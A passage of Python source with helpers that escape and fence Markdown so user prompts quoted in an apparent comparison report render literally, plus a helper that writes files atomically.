    body = text.replace("\n", " ").replace("\r", "")
    if in_table:
        body = body.replace("|", "\\|")
    fence = "`" * (_backtick_run(body) + 1)
    # CommonMark strips one leading and one trailing space from a code span, so
    # padding keeps a leading or trailing backtick as content, not delimiter.
    pad = " " if body.startswith("`") or body.endswith("`") else ""
    return f"{fence}{pad}{body}{pad}{fence}"


def _md_fence_for(text: str) -> str:
    """The shortest fence `text` cannot close from the inside.

    A fenced block ends at a line whose backtick run is at least as long as the
    opening fence, so a model output containing a triple backtick closed the
    block the report had just opened around it - and everything after was parsed
    as the report's own markup. Escaping cannot fix that: inside a fence there is
    no escaping. A longer fence can.
    """
    return "`" * max(3, _backtick_run(text) + 1)


# Characters that change how a line renders wherever they appear. `|` and `\\`
# were already handled; the rest were not, so a prompt containing them was
# reformatted by the report that was supposed to quote it.
_MD_ESCAPES = frozenset("\\`*_[]<>|")

# Escaped only at the start of a line, where they open a block. Every current
# caller renders inline, so this is cheap insurance rather than a live fix.
_MD_LEADING_ESCAPES = frozenset("#-+")


def _md_escape(text: str) -> str:
    """Escape Markdown so user text renders as the text that was actually sent.

    Only `\\`, `|` and newline were escaped. Everything else formatted: a
    backtick opened a code span, `*` and `_` became emphasis, `[a](b)` became a
    live link, and `<img src=...>` passed straight through as raw HTML into a
    report someone circulates. The reader could not tell the prompt from the
    report's own markup, and the prompt is the one thing a comparison report has
    to reproduce exactly.

    Newlines still become " / " so the result stays on one line for a table
    cell.
    """
    if not text:
        return ""
    escaped = "".join(
        "\\" + ch if ch in _MD_ESCAPES else (" / " if ch == "\n" else ch) for ch in text
    )
    if escaped[:1] in _MD_LEADING_ESCAPES:
        escaped = "\\" + escaped
    return escaped


# ===== Atomic write helper =====


def atomic_write_bytes(path: Path, data: bytes) -> None:
    """Write `data` to `path` atomically.

    Writes to a sibling `<name>.tmp` first then `os.replace`s into place.
    `os.replace` is atomic on POSIX and on Windows (Python 3.3+). If a
    failure happens between write and replace, the `.tmp` file is cleaned up.
    """
    tmp = path.with_name(path.name + ".tmp")
    try:
        tmp.write_bytes(data)
        os.replace(tmp, path)
    except BaseException:
        # Including BaseException so KeyboardInterrupt cleans up too.
        if tmp.exists():
            try:
                tmp.unlink()
            except OSError:
                pass
        raise
